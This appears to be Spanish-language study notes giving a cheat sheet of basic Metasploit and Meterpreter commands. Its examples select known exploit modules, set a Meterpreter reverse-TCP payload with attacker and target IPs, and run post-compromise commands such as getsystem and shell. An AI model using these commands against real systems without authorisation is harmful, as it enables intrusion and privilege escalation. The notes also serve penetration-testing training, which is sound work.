# Metasploit - Comandos básicos

### <mark style="color:yellow;">Tabla de comandos básicos de Metasploit</mark>

| **Comando**                                       | **Uso**                                 | **Ejemplo**                                                                                                                                                      |
| ------------------------------------------------- | --------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `use [auxiliary/exploit/payload/encoder/evasion]` | Seleccionar un módulo específico        | `msf> use exploit/unix/ftp/vsftpd_234_backdoor`                                                                                                                  |
| `show [exploits/payloads/options/etc.]`           | Ver lista de módulos disponibles        | <p><code>msf> show payloads</code><br><code>msf> show options</code></p>                                                                                         |
| `set [opción/payload]`                            | Asignar valor a un parámetro específico | <p><code>msf> set payload windows/meterpreter/reverse_tcp</code><br><code>msf> set LHOST 192.168.10.118</code><br><code>msf> set RHOST 192.168.10.112</code></p> |
| `setg [opción/payload]`                           | Asignar valor global a un parámetro     | `msf> setg RHOST 192.168.10.112`                                                                                                                                 |
| `run`                                             | Ejecutar un módulo auxiliar             | `msf> run`                                                                                                                                                       |
| `exploit`                                         | Ejecutar un exploit                     | `msf> exploit`                                                                                                                                                   |
| `back`                                            | Salir del módulo actual y volver        | `msf(ms08_067_netapi)> back`                                                                                                                                     |
| `info`                                            | Ver información detallada de un módulo  | `msf> info exploit/windows/smb/ms08_067_netapi`                                                                                                                  |
| `search`                                          | Buscar un módulo específico             | `msf> search hfs`                                                                                                                                                |
| `check`                                           | Verificar si el objetivo es vulnerable  | `msf> check`                                                                                                                                                     |
| `sessions`                                        | Listar sesiones activas                 | `msf> sessions [número]`                                                                                                                                         |

### <mark style="color:yellow;">Comandos básicos de Meterpreter(se verá más adelante)</mark>

| **Comando**             | **Uso**                                      | **Ejemplo**               |
| ----------------------- | -------------------------------------------- | ------------------------- |
| `sysinfo`               | Obtener información del sistema comprometido | `meterpreter> sysinfo`    |
| `ifconfig` / `ipconfig` | Listar interfaces de red                     | `meterpreter> ifconfig`   |
| `arp`                   | Ver IPs y MACs conectadas al objetivo        | `meterpreter> arp`        |
| `background`            | Enviar sesión activa a segundo plano         | `meterpreter> background` |
| `shell`                 | Abrir shell de comandos                      | `meterpreter> shell`      |
| `getuid`                | Obtener nombre de usuario actual             | `meterpreter> getuid`     |
| `getsystem`             | Escalar privilegios a SYSTEM                 | `meterpreter> getsystem`  |
| `getpid`                | Obtener el PID del proceso de Meterpreter    | `meterpreter> getpid`     |
| `ps`                    | Listar todos los procesos activos            | `meterpreter> ps`         |
